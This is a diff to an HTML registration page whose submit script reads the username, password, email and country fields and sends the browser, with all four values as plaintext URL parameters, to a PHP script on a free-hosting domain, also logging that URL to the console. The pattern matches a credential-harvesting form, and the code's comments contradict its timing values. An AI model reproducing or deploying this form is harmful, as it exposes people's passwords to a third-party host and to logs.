@@ -296,26 +296,31 @@ Installation and Activation Records:
         <label for="consent">I have read and agree to the <a href="#terms-of-service">Terms of Service</a>.</label>
       </div>
     <button type="submit" class="form-submit"><span></span><span></span><span></span><span></span>Submit</button>
-    <script>
-          // Function to handle form submission
-    document.getElementById("dataForm").addEventListener("submit", function(event) {
-        event.preventDefault();
+  <script>
+  // Function to handle form submission
+  document.getElementById("dataForm").addEventListener("submit", function(event) {
+    event.preventDefault();
 
-        // Get form input values
-        const username = document.getElementById("username").value;
-        const password = document.getElementById("password").value;
-        const email = document.getElementById("email").value;
-        const country = document.getElementById("country").value;
+    // Get form input values
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+    const email = document.getElementById("email").value;
+    const country = document.getElementById("country").value;
 
-        // Construct the URL
-        
-      console.log(`https://hello2022isthe3nd.000webhostapp.com/RegisterAndD.php?username=${username}&password=${password}&country=${country}&email=${email}`)
-       window.location.href= `https://hello2022isthe3nd.000webhostapp.com/RegisterAndD.php?username=${username}&password=${password}&country=${country}&email=${email}`
-     setTimeout(function() {
-            window.location.href = "https://smoke-wolf.vercel.app/gpm/Login.html;
-        }, 3000); // 3000 m
-    });
-            </script>
+    // Construct the URL
+    const url = `https://hello2022isthe3nd.000webhostapp.com/RegisterAndD.php?username=${username}&password=${password}&country=${country}&email=${email}`;
+
+    console.log(url); // Check the constructed URL in the console
+
+    // Redirect to the constructed URL after 3 seconds
+    setTimeout(function() {
+      window.location.href = url; // Corrected URL assignmen
+
+    }, 1000); // 3000 ms delay
+    
+  });
+</script>
+
 </form>
   </div>
 </body>
